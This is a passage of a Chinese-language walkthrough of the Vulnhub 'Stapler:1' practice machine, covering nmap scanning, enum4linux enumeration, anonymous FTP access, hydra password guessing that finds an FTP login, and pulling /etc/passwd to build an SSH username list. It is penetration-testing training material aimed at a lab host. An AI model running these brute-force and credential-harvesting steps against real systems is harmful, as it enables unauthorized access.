[VMware 导入 ovf 文件格式异常报错之探解 | Secrypt Agency (ciphersaw.me)](https://ciphersaw.me/2021/07/10/exploration-of-file-format-exception-while-vmware-loads-ovf/)

[【Vulnhub】 Stapler：1 | Secrypt Agency (ciphersaw.me)](https://ciphersaw.me/2021/08/29/vulnhub-stapler-1/#0x03-Web-渗透)

[OSCP 推荐靶场 0x07 - Stapler 鸟瞰全局式打法 WP破点_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1ms4y1K7cB/?spm_id_from=333.337.search-card.all.click&vd_source=f21386f67860beb8cb1ded310d802d3f)

# 信息搜集

## nmap探测

1、端口存活

``` bash
└─# nmap -sS -p- --min-rate 6666 192.168.0.102 -oA port_info
```

```bash
PORT      STATE  SERVICE
20/tcp    closed ftp-data
21/tcp    open   ftp
22/tcp    open   ssh
53/tcp    open   domain
80/tcp    open   http
123/tcp   closed ntp
137/tcp   closed netbios-ns
138/tcp   closed netbios-dgm
139/tcp   open   netbios-ssn
666/tcp   open   doom
3306/tcp  open   mysql
12380/tcp open   unknown
MAC Address: 00:0C:29:C6:23:3B (VMware)
```

2、提取端口详细扫描

```bash
└─# cat port_info.nmap | grep '/' | awk -F '/' '{print $1}' | tr '\n' ',' 
20,21,22,53,80,123,137,138,139,666,3306,12380,   
```

```bash
└─# nmap -n -sT -sVC -O -A -p20,21,22,53,80,123,137,138,139,666,3306,12380 192.168.0.102 
```

```bash
PORT      STATE  SERVICE     VERSION
20/tcp    closed ftp-data
21/tcp    open   ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.0.103
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8121cea11a05b1694f4ded8028e89905 (RSA)
|   256 5ba5bb67911a51c2d321dac0caf0db9e (ECDSA)
|_  256 6d01b773acb0936ffab989e6ae3cabd3 (ED25519)
53/tcp    open   domain      dnsmasq 2.75
| dns-nsid: 
|_  bind.version: dnsmasq-2.75
80/tcp    open   http        PHP cli server 5.5 or later
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
123/tcp   closed ntp
137/tcp   closed netbios-ns
138/tcp   closed netbios-dgm
139/tcp   open   netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
666/tcp   open   tcpwrapped
3306/tcp  open   mysql       MySQL 5.7.12-0ubuntu1
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.12-0ubuntu1
|   Thread ID: 8
|   Capabilities flags: 63487
|   Some Capabilities: Support41Auth, Speaks41ProtocolNew, InteractiveClient, Speaks41ProtocolOld, LongColumnFlag, IgnoreSpaceBeforeParenthesis, IgnoreSigpipes, FoundRows, SupportsCompression, SupportsTransactions, ConnectWithDatabase, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, LongPassword, ODBCClient, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: K\x13L/^\x06Ut\x0BuB^\x14W\x12B;ITC
|_  Auth Plugin Name: mysql_native_password
12380/tcp open   http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Tim, we need to-do better next year for Initech
MAC Address: 00:0C:29:C6:23:3B (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Host: RED; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 7h38m22s, deviation: 34m37s, median: 7h58m21s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.9-Ubuntu)
|   Computer name: red
|   NetBIOS computer name: RED\x00
|   Domain name: \x00
|   FQDN: red
|_  System time: 2023-06-21T14:51:05+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: RED, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb2-time: 
|   date: 2023-06-21T13:51:05
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
```

3、指定脚本漏扫

```bash
└─# nmap --script=vuln  -p20,21,22,53,80,123,137,138,139,666,3306,12380 192.168.0.102 
```

```bash
PORT      STATE  SERVICE
20/tcp    closed ftp-data
21/tcp    open   ftp
22/tcp    open   ssh
53/tcp    open   domain
80/tcp    open   http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
123/tcp   closed ntp
137/tcp   closed netbios-ns
138/tcp   closed netbios-dgm
139/tcp   open   netbios-ssn
666/tcp   open   doom
3306/tcp  open   mysql
12380/tcp open   unknown
MAC Address: 00:0C:29:C6:23:3B (VMware)

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: false
| smb-vuln-cve2009-3103: 
|   VULNERABLE:
|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2009-3103
|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,
|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a
|           denial of service (system crash) via an & (ampersand) character in a Process ID High header field in a NEGOTIATE
|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,
|           aka "SMBv2 Negotiation Vulnerability."
|           
|     Disclosure date: 2009-09-08
|     References:
|       http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
| smb-vuln-regsvc-dos: 
|   VULNERABLE:
|   Service regsvc in Microsoft Windows systems vulnerable to denial of service
|     State: VULNERABLE
|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference
|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes
|       while working on smb-enum-sessions.
|_          
```

## 服务枚举

这里重点发现了一些本地的用户名，可以使用  hydra 对 ftp 和 ssh 进行爆破

```bash
┌──(root💀kali)-[~/Stapler]
└─# enum4linux 192.168.0.102
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Jun 21 02:02:55 2023

 =========================================( Target Information )=========================================

Target ........... 192.168.0.102
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 192.168.0.102 )===========================


[+] Got domain/workgroup name: WORKGROUP


 ===============================( Nbtstat Information for 192.168.0.102 )===============================

Looking up status of 192.168.0.102
        RED             <00> -         H <ACTIVE>  Workstation Service
        RED             <03> -         H <ACTIVE>  Messenger Service
        RED             <20> -         H <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> H <ACTIVE>  Master Browser
        WORKGROUP       <00> - <GROUP> H <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1d> -         H <ACTIVE>  Master Browser
        WORKGROUP       <1e> - <GROUP> H <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 ===================================( Session Check on 192.168.0.102 )===================================


[+] Server 192.168.0.102 allows sessions using username '', password ''


 ================================( Getting domain SID for 192.168.0.102 )================================

Domain Name: WORKGROUP
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup


 ==================================( OS information on 192.168.0.102 )==================================


[E] Can't get OS info with smbclient


[+] Got OS info for 192.168.0.102 from srvinfo: 
        RED            Wk Sv PrQ Unx NT SNT red server (Samba, Ubuntu)
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03


 =======================================( Users on 192.168.0.102 )=======================================

Use of uninitialized value $users in print at ./enum4linux.pl line 972.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 975.

Use of uninitialized value $users in print at ./enum4linux.pl line 986.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 988.

 =================================( Share Enumeration on 192.168.0.102 )=================================


        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        kathy           Disk      Fred, What are we doing here?
        tmp             Disk      All temporary files should be stored here
        IPC$            IPC       IPC Service (red server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            RED

[+] Attempting to map shares on 192.168.0.102

//192.168.0.102/print$  Mapping: DENIED Listing: N/A Writing: N/A
//192.168.0.102/kathy   Mapping: OK Listing: OK Writing: N/A
//192.168.0.102/tmp     Mapping: OK Listing: OK Writing: N/A

[E] Can't understand response:

NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
//192.168.0.102/IPC$    Mapping: N/A Listing: N/A Writing: N/A

 ===========================( Password Policy Information for 192.168.0.102 )===========================



[+] Attaching to 192.168.0.102 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] RED
        [+] Builtin

[+] Password Info for Domain: RED

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: Not Set
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: Not Set



[+] Retieved partial password policy with rpcclient:


Password Complexity: Disabled
Minimum Password Length: 5


 ======================================( Groups on 192.168.0.102 )======================================


[+] Getting builtin groups:


[+]  Getting builtin group memberships:


[+]  Getting local groups:


[+]  Getting local group memberships:


[+]  Getting domain groups:


[+]  Getting domain group memberships:


 ==================( Users on 192.168.0.102 via RID cycling (RIDS: 500-550,1000-1050) )==================


[I] Found new SID: 
S-1-22-1

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\peter (Local User)
S-1-22-1-1001 Unix User\RNunemaker (Local User)
S-1-22-1-1002 Unix User\ETollefson (Local User)
S-1-22-1-1003 Unix User\DSwanger (Local User)
S-1-22-1-1004 Unix User\AParnell (Local User)
S-1-22-1-1005 Unix User\SHayslett (Local User)
S-1-22-1-1006 Unix User\MBassin (Local User)
S-1-22-1-1007 Unix User\JBare (Local User)
S-1-22-1-1008 Unix User\LSolum (Local User)
S-1-22-1-1009 Unix User\IChadwick (Local User)
S-1-22-1-1010 Unix User\MFrei (Local User)
S-1-22-1-1011 Unix User\SStroud (Local User)
S-1-22-1-1012 Unix User\CCeaser (Local User)
S-1-22-1-1013 Unix User\JKanode (Local User)
S-1-22-1-1014 Unix User\CJoo (Local User)
S-1-22-1-1015 Unix User\Eeth (Local User)
S-1-22-1-1016 Unix User\LSolum2 (Local User)
S-1-22-1-1017 Unix User\JLipps (Local User)
S-1-22-1-1018 Unix User\jamie (Local User)
S-1-22-1-1019 Unix User\Sam (Local User)
S-1-22-1-1020 Unix User\Drew (Local User)
S-1-22-1-1021 Unix User\jess (Local User)
S-1-22-1-1022 Unix User\SHAY (Local User)
S-1-22-1-1023 Unix User\Taylor (Local User)
S-1-22-1-1024 Unix User\mel (Local User)
S-1-22-1-1025 Unix User\kai (Local User)
S-1-22-1-1026 Unix User\zoe (Local User)
S-1-22-1-1027 Unix User\NATHAN (Local User)
S-1-22-1-1028 Unix User\www (Local User)
S-1-22-1-1029 Unix User\elly (Local User)

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''

S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

[+] Enumerating users using SID S-1-5-21-864226560-67800430-3082388513 and logon username '', password ''

S-1-5-21-864226560-67800430-3082388513-501 RED\nobody (Local User)
S-1-5-21-864226560-67800430-3082388513-513 RED\None (Domain Group)

 ===============================( Getting printer info for 192.168.0.102 )===============================

No printers returned.
```

## 端口探测

### 21：FTP

之前从 nmap 扫描结果看可以 `21`  `ftp` 文件服务端口 ，可以使用 `anonymous` 用户名与任意口令登录

然后发现 当前目录有 `note` 文件，下载下来看看

```bash
└─# ftp 192.168.0.102
Connected to 192.168.0.102.
220-
220-|-----------------------------------------------------------------------------------------|
220-| Harry, make sure to update the banner when you get a chance to show who has access here |
220-|-----------------------------------------------------------------------------------------|
220-
220 
Name (192.168.0.102:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
550 Permission denied.
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             107 Jun 03  2016 note
226 Directory send OK.
ftp> get note
local: note remote: note
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note (107 bytes).
100% |*****************************************************************************************************************|   107        1.70 MiB/s    00:00 ETA
226 Transfer complete.
107 bytes received in 00:00 (241.32 KiB/s)
```

```bash
┌──(root💀kali)-[~/Stapler/21]
└─# cat note                                                              
Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.
```

发现了一些用户名，把用户名做成字典，用 hydra 再来枚举下 ftp 用户 的弱口令登录，发现 ftp 账户弱口令 `elly:ylle`

```bash
┌──(root💀kali)-[~/Stapler/21]
└─# cat ftp_name 
Elly
John
Harry
elly
john
harry
ELLY
JOHN
HARRY
                                                                                                                                                              
┌──(root💀kali)-[~/Stapler/21]
└─# hydra -L ftp_name -e nsr ftp://192.168.0.102
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-06-21 02:27:06
[DATA] max 16 tasks per 1 server, overall 16 tasks, 27 login tries (l:9/p:3), ~2 tries per task
[DATA] attacking ftp://192.168.0.102:21/
[21][ftp] host: 192.168.0.102   login: elly   password: ylle
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-06-21 02:27:13
```

再使用 `elly:ylle` ftp 登录查看重要信息，发现它挂载到 /etc 目录下，下载 passwd 看看

```bash
┌──(root💀kali)-[~/Stapler/21]
└─# ftp 192.168.0.102
Connected to 192.168.0.102.
220-
220-|-----------------------------------------------------------------------------------------|
220-| Harry, make sure to update the banner when you get a chance to show who has access here |
220-|-----------------------------------------------------------------------------------------|
220-
220 
Name (192.168.0.102:kali): elly
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
550 Permission denied.
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    5 0        0            4096 Jun 03  2016 X11
drwxr-xr-x    3 0        0            4096 Jun 03  2016 acpi
-rw-r--r--    1 0        0            3028 Apr 20  2016 adduser.conf
-rw-r--r--    1 0        0              51 Jun 03  2016 aliases
-rw-r--r--    1 0        0           12288 Jun 03  2016 aliases.db
drwxr-xr-x    2 0        0            4096 Jun 07  2016 alternatives
drwxr-xr-x    8 0        0            4096 Jun 03  2016 apache2
drwxr-xr-x    3 0        0            4096 Jun 03  2016 apparmor
drwxr-xr-x    9 0        0            4096 Jun 06  2016 apparmor.d
drwxr-xr-x    3 0        0            4096 Jun 03  2016 apport
drwxr-xr-x    6 0        0            4096 Jun 03  2016 apt
-rw-r-----    1 0        1             144 Jan 14  2016 at.deny
drwxr-xr-x    5 0        0            4096 Jun 03  2016 authbind
-rw-r--r--    1 0        0            2188 Sep 01  2015 bash.bashrc
drwxr-xr-x    2 0        0            4096 Jun 03  2016 bash_completion.d
-rw-r--r--    1 0        0             367 Jan 27  2016 bindresvport.blacklist
drwxr-xr-x    2 0        0            4096 Apr 12  2016 binfmt.d
drwxr-xr-x    2 0        0            4096 Jun 03  2016 byobu
drwxr-xr-x    3 0        0            4096 Jun 03  2016 ca-certificates
-rw-r--r--    1 0        0            7788 Jun 03  2016 ca-certificates.conf
drwxr-xr-x    2 0        0            4096 Jun 03  2016 console-setup
drwxr-xr-x    2 0        0            4096 Jun 03  2016 cron.d
drwxr-xr-x    2 0        0            4096 Jun 03  2016 cron.daily
drwxr-xr-x    2 0        0            4096 Jun 03  2016 cron.hourly
drwxr-xr-x    2 0        0            4096 Jun 03  2016 cron.monthly
drwxr-xr-x    2 0        0            4096 Jun 03  2016 cron.weekly
-rw-r--r--    1 0        0             722 Apr 05  2016 crontab
-rw-r--r--    1 0        0              54 Jun 03  2016 crypttab
drwxr-xr-x    2 0        0            4096 Jun 04  2016 dbconfig-common
drwxr-xr-x    4 0        0            4096 Jun 03  2016 dbus-1
-rw-r--r--    1 0        0            2969 Nov 10  2015 debconf.conf
-rw-r--r--    1 0        0              12 Apr 30  2015 debian_version
drwxr-xr-x    3 0        0            4096 Jun 05  2016 default
-rw-r--r--    1 0        0             604 Jul 02  2015 deluser.conf
drwxr-xr-x    2 0        0            4096 Jun 03  2016 depmod.d
drwxr-xr-x    4 0        0            4096 Jun 03  2016 dhcp
-rw-r--r--    1 0        0           26716 Jul 30  2015 dnsmasq.conf
drwxr-xr-x    2 0        0            4096 Jun 03  2016 dnsmasq.d
drwxr-xr-x    4 0        0            4096 Jun 07  2016 dpkg
-rw-r--r--    1 0        0              96 Apr 20  2016 environment
drwxr-xr-x    4 0        0            4096 Jun 03  2016 fonts
-rw-r--r--    1 0        0             594 Jun 03  2016 fstab
-rw-r--r--    1 0        0             132 Feb 11  2016 ftpusers
-rw-r--r--    1 0        0             280 Jun 20  2014 fuse.conf
-rw-r--r--    1 0        0            2584 Feb 18  2016 gai.conf
-rw-rw-r--    1 0        0            1253 Jun 04  2016 group
-rw-------    1 0        0            1240 Jun 03  2016 group-
drwxr-xr-x    2 0        0            4096 Jun 03  2016 grub.d
-rw-r-----    1 0        42           1004 Jun 04  2016 gshadow
-rw-------    1 0        0             995 Jun 03  2016 gshadow-
drwxr-xr-x    3 0        0            4096 Jun 03  2016 gss
-rw-r--r--    1 0        0              92 Oct 22  2015 host.conf
-rw-r--r--    1 0        0              12 Jun 03  2016 hostname
-rw-r--r--    1 0        0             469 Jun 05  2016 hosts
-rw-r--r--    1 0        0             411 Jun 03  2016 hosts.allow
-rw-r--r--    1 0        0             711 Jun 03  2016 hosts.deny
-rw-r--r--    1 0        0            1257 Jun 03  2016 inetd.conf
drwxr-xr-x    2 0        0            4096 Feb 06  2016 inetd.d
drwxr-xr-x    2 0        0            4096 Jun 06  2016 init
drwxr-xr-x    2 0        0            4096 Jun 06  2016 init.d
drwxr-xr-x    5 0        0            4096 Jun 03  2016 initramfs-tools
-rw-r--r--    1 0        0            1748 Feb 04  2016 inputrc
drwxr-xr-x    3 0        0            4096 Jun 03  2016 insserv
-rw-r--r--    1 0        0             771 Mar 06  2015 insserv.conf
drwxr-xr-x    2 0        0            4096 Jun 03  2016 insserv.conf.d
drwxr-xr-x    2 0        0            4096 Jun 03  2016 iproute2
drwxr-xr-x    2 0        0            4096 Jun 03  2016 iptables
drwxr-xr-x    2 0        0            4096 Jun 03  2016 iscsi
-rw-r--r--    1 0        0             345 Jun 21 14:35 issue
-rw-r--r--    1 0        0             197 Jun 03  2016 issue.net
drwxr-xr-x    2 0        0            4096 Jun 03  2016 kbd
drwxr-xr-x    5 0        0            4096 Jun 03  2016 kernel
-rw-r--r--    1 0        0             144 Jun 03  2016 kernel-img.conf
-rw-r--r--    1 0        0           26754 Jun 07  2016 ld.so.cache
-rw-r--r--    1 0        0              34 Jan 27  2016 ld.so.conf
drwxr-xr-x    2 0        0            4096 Jun 07  2016 ld.so.conf.d
drwxr-xr-x    2 0        0            4096 Jun 03  2016 ldap
-rw-r--r--    1 0        0             267 Oct 22  2015 legal
-rw-r--r--    1 0        0             191 Jan 19  2016 libaudit.conf
drwxr-xr-x    2 0        0            4096 Jun 03  2016 libnl-3
drwxr-xr-x    4 0        0            4096 Jun 06  2016 lighttpd
-rw-r--r--    1 0        0            2995 Apr 14  2016 locale.alias
-rw-r--r--    1 0        0            9149 Jun 03  2016 locale.gen
-rw-r--r--    1 0        0            3687 Jun 03  2016 localtime
drwxr-xr-x    6 0        0            4096 Jun 03  2016 logcheck
-rw-r--r--    1 0        0           10551 Mar 29  2016 login.defs
-rw-r--r--    1 0        0             703 May 06  2015 logrotate.conf
drwxr-xr-x    2 0        0            4096 Jun 04  2016 logrotate.d
-rw-r--r--    1 0        0             103 Apr 12  2016 lsb-release
drwxr-xr-x    2 0        0            4096 Jun 03  2016 lvm
-r--r--r--    1 0        0              33 Jun 03  2016 machine-id
-rw-r--r--    1 0        0             111 Nov 20  2015 magic
-rw-r--r--    1 0        0             111 Nov 20  2015 magic.mime
-rw-r--r--    1 0        0            2579 Jun 04  2016 mailcap
-rw-r--r--    1 0        0             449 Oct 30  2015 mailcap.order
drwxr-xr-x    2 0        0            4096 Jun 03  2016 mdadm
-rw-r--r--    1 0        0           24241 Oct 30  2015 mime.types
-rw-r--r--    1 0        0             967 Oct 30  2015 mke2fs.conf
drwxr-xr-x    2 0        0            4096 Jun 03  2016 modprobe.d
-rw-r--r--    1 0        0             195 Apr 20  2016 modules
drwxr-xr-x    2 0        0            4096 Jun 03  2016 modules-load.d
lrwxrwxrwx    1 0        0              19 Jun 03  2016 mtab -> ../proc/self/mounts
drwxr-xr-x    4 0        0            4096 Jun 06  2016 mysql
drwxr-xr-x    7 0        0            4096 Jun 03  2016 network
-rw-r--r--    1 0        0              91 Oct 22  2015 networks
drwxr-xr-x    2 0        0            4096 Jun 03  2016 newt
-rw-r--r--    1 0        0             497 May 04  2014 nsswitch.conf
drwxr-xr-x    2 0        0            4096 Apr 20  2016 opt
lrwxrwxrwx    1 0        0              21 Jun 03  2016 os-release -> ../usr/lib/os-release
-rw-r--r--    1 0        0            6595 Jun 23  2015 overlayroot.conf
-rw-r--r--    1 0        0             552 Mar 16  2016 pam.conf
drwxr-xr-x    2 0        0            4096 Jun 03  2016 pam.d
-rw-r--r--    1 0        0            2908 Jun 04  2016 passwd
-rw-------    1 0        0            2869 Jun 03  2016 passwd-
drwxr-xr-x    4 0        0            4096 Jun 03  2016 perl
drwxr-xr-x    3 0        0            4096 Jun 03  2016 php
drwxr-xr-x    3 0        0            4096 Jun 06  2016 phpmyadmin
drwxr-xr-x    3 0        0            4096 Jun 03  2016 pm
drwxr-xr-x    5 0        0            4096 Jun 03  2016 polkit-1
drwxr-xr-x    3 0        0            4096 Jun 03  2016 postfix
drwxr-xr-x    4 0        0            4096 Jun 03  2016 ppp
-rw-r--r--    1 0        0             575 Oct 22  2015 profile
drwxr-xr-x    2 0        0            4096 Jun 03  2016 profile.d
-rw-r--r--    1 0        0            2932 Oct 25  2014 protocols
drwxr-xr-x    2 0        0            4096 Jun 03  2016 python
drwxr-xr-x    2 0        0            4096 Jun 03  2016 python2.7
drwxr-xr-x    2 0        0            4096 Jun 03  2016 python3
drwxr-xr-x    2 0        0            4096 Jun 03  2016 python3.5
-rwxr-xr-x    1 0        0             472 Jun 06  2016 rc.local
drwxr-xr-x    2 0        0            4096 Jun 06  2016 rc0.d
drwxr-xr-x    2 0        0            4096 Jun 06  2016 rc1.d
drwxr-xr-x    2 0        0            4096 Jun 06  2016 rc2.d
drwxr-xr-x    2 0        0            4096 Jun 06  2016 rc3.d
drwxr-xr-x    2 0        0            4096 Jun 06  2016 rc4.d
drwxr-xr-x    2 0        0            4096 Jun 06  2016 rc5.d
drwxr-xr-x    2 0        0            4096 Jun 06  2016 rc6.d
drwxr-xr-x    2 0        0            4096 Jun 06  2016 rcS.d
-rw-r--r--    1 0        0              46 Jun 21 14:35 resolv.conf
drwxr-xr-x    5 0        0            4096 Jun 06  2016 resolvconf
-rwxr-xr-x    1 0        0             268 Nov 10  2015 rmt
-rw-r--r--    1 0        0             887 Oct 25  2014 rpc
-rw-r--r--    1 0        0            1371 Jan 27  2016 rsyslog.conf
drwxr-xr-x    2 0        0            4096 Jun 03  2016 rsyslog.d
drwxr-xr-x    3 0        0            4096 Jun 21 14:35 samba
-rw-r--r--    1 0        0            3663 Jun 09  2015 screenrc
-rw-r--r--    1 0        0            4038 Mar 29  2016 securetty
drwxr-xr-x    4 0        0            4096 Jun 03  2016 security
drwxr-xr-x    2 0        0            4096 Jun 03  2016 selinux
-rw-r--r--    1 0        0           19605 Oct 25  2014 services
drwxr-xr-x    2 0        0            4096 Jun 03  2016 sgml
-rw-r-----    1 0        42           4518 Jun 05  2016 shadow
-rw-------    1 0        0            1873 Jun 03  2016 shadow-
-rw-r--r--    1 0        0             125 Jun 03  2016 shells
drwxr-xr-x    2 0        0            4096 Jun 03  2016 skel
-rw-r--r--    1 0        0             100 Nov 25  2015 sos.conf
drwxr-xr-x    2 0        0            4096 Jun 04  2016 ssh
drwxr-xr-x    4 0        0            4096 Jun 03  2016 ssl
-rw-r--r--    1 0        0             644 Jun 04  2016 subgid
-rw-------    1 0        0             625 Jun 03  2016 subgid-
-rw-r--r--    1 0        0             644 Jun 04  2016 subuid
-rw-------    1 0        0             625 Jun 03  2016 subuid-
-r--r-----    1 0        0             769 Jun 05  2016 sudoers
drwxr-xr-x    2 0        0            4096 Jun 03  2016 sudoers.d
-rw-r--r--    1 0        0            2227 Jun 03  2016 sysctl.conf
drwxr-xr-x    2 0        0            4096 Jun 03  2016 sysctl.d
drwxr-xr-x    5 0        0            4096 Jun 03  2016 systemd
drwxr-xr-x    2 0        0            4096 Jun 03  2016 terminfo
-rw-r--r--    1 0        0              14 Jun 03  2016 timezone
drwxr-xr-x    2 0        0            4096 Apr 12  2016 tmpfiles.d
-rw-r--r--    1 0        0            1260 Mar 16  2016 ucf.conf
drwxr-xr-x    4 0        0            4096 Jun 03  2016 udev
drwxr-xr-x    3 0        0            4096 Jun 03  2016 ufw
drwxr-xr-x    2 0        0            4096 Jun 03  2016 update-motd.d
drwxr-xr-x    2 0        0            4096 Jun 03  2016 update-notifier
drwxr-xr-x    2 0        0            4096 Jun 03  2016 vim
drwxr-xr-x    3 0        0            4096 Jun 03  2016 vmware-tools
-rw-r--r--    1 0        0             278 Jun 03  2016 vsftpd.banner
-rw-r--r--    1 0        0               0 Jun 03  2016 vsftpd.chroot_list
-rw-r--r--    1 0        0            5961 Jun 04  2016 vsftpd.conf
-rw-r--r--    1 0        0               0 Jun 03  2016 vsftpd.user_list
lrwxrwxrwx    1 0        0              23 Jun 03  2016 vtrgb -> /etc/alternatives/vtrgb
-rw-r--r--    1 0        0            4942 Jan 08  2016 wgetrc
drwxr-xr-x    3 0        0            4096 Jun 03  2016 xdg
drwxr-xr-x    2 0        0            4096 Jun 03  2016 xml
drwxr-xr-x    2 0        0            4096 Jun 03  2016 zsh
226 Directory send OK.
ftp> get passwd
local: passwd remote: passwd
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for passwd (2908 bytes).
100% |*****************************************************************************************************************|  2908        4.67 MiB/s    00:00 ETA
226 Transfer complete.
2908 bytes received in 00:00 (1.71 MiB/s)
```

将其中具有可登录 shell 的用户筛选出来，存至 ssh_user_name：

```bash
┌──(root💀kali)-[~/Stapler/21]
└─# cat passwd | grep -v -E "nologin|false" | cut -d ":" -f 1 > ssh_user_name
                                                                                                                                                              
┌──(root💀kali)-[~/Stapler/21]
└─# ls
ftp_name  note  passwd  ssh_user_name
                                                                                                                                                              
┌──(root💀kali)-[~/Stapler/21]
└─# cat ssh_user_name                                                        
root
sync
peter
RNunemaker
ETollefson
DSwanger
AParnell
SHayslett
MBassin
JBare
LSolum
MFrei
SStroud
CCeaser
JKanode
CJoo
JLipps
jamie
Sam
Drew
jess
SHAY
Taylor
mel
kai
zoe
NATHAN
www
elly
```

### 22：SSH

将上述 ssh_user_name 作为 SSH 服务的用户名列表，同样使用 hydra 工具检测是否存在空口令、同名口令、同名逆向口令等。结果显示，**SHayslett 用户名存在同名口令 SHayslett**：

```bash
└─# hydra -L ssh_user_name -e nsr ssh://192.168.0.102 -t 4
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

